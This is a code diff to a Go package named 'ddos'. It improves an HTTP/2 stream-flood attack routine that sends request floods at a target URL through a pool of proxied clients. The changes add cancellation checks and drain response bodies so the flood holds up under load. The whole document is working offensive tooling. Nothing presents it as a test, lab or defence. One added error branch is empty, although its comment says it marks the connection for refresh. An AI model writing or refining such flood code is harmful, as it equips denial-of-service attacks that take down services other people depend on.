@@ -1,6 +1,7 @@
 package ddos
 
 import (
+	"io"
 	"net/http"
 	"strings"
 	"sync"
@@ -84,6 +85,13 @@ func (d *DDoSAttack) http2StreamFloodWorkerWithPool(pool *ClientPool, targetURL 
 			}
 
 			for i := 0; i < streamsToCreate; i++ {
+				// Check context before creating each stream
+				select {
+				case <-d.ctx.Done():
+					return
+				default:
+				}
+
 				wg.Add(1)
 				limiter.Execute(func() {
 					defer wg.Done()
@@ -94,6 +102,13 @@ func (d *DDoSAttack) http2StreamFloodWorkerWithPool(pool *ClientPool, targetURL 
 							atomic.AddInt64(&d.requestsFailed, 1)
 						}
 					}()
+
+					// Check context before proceeding
+					select {
+					case <-d.ctx.Done():
+						return
+					default:
+					}
 
 					client := pool.GetClient()
 					if client == nil {
@@ -145,6 +160,7 @@ func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *
 	atomic.AddInt64(&d.activeConns, 1)
 	defer atomic.AddInt64(&d.activeConns, -1)
 
+	// Ensure request has context for proper cancellation
 	req = req.WithContext(d.ctx)
 
 	startTime := time.Now()
@@ -154,16 +170,26 @@ func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *
 	responseTime := time.Since(startTime)
 
 	if err != nil {
+		// Check if this is an HTTP/2 specific error (like "Unsolicited response")
+		if isHTTP2Error(err) {
+			// HTTP/2 connection error - mark for refresh but don't fail proxy immediately
+			// This helps prevent cascading failures
+		}
 		atomic.AddInt64(&d.requestsFailed, 1)
 		if proxyURL != "" {
 			d.markProxyFailure(proxyURL)
 		}
 		return false
 	}
-	defer resp.Body.Close()
 
-	// Always skip response reading for maximum efficiency
-	resp.Body.Close()
+	// Properly drain response body before closing to prevent HTTP/2 stream issues
+	// This is critical for HTTP/2 to mark streams as complete
+	if resp.Body != nil {
+		// Drain the body completely to ensure stream is properly closed
+		// Use io.Copy with a limit to prevent reading too much data
+		io.CopyN(io.Discard, resp.Body, 4096) // Read up to 4KB, then close
+		resp.Body.Close()
+	}
 
 	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
 	atomic.AddInt64(&d.requestsSuccess, 1)
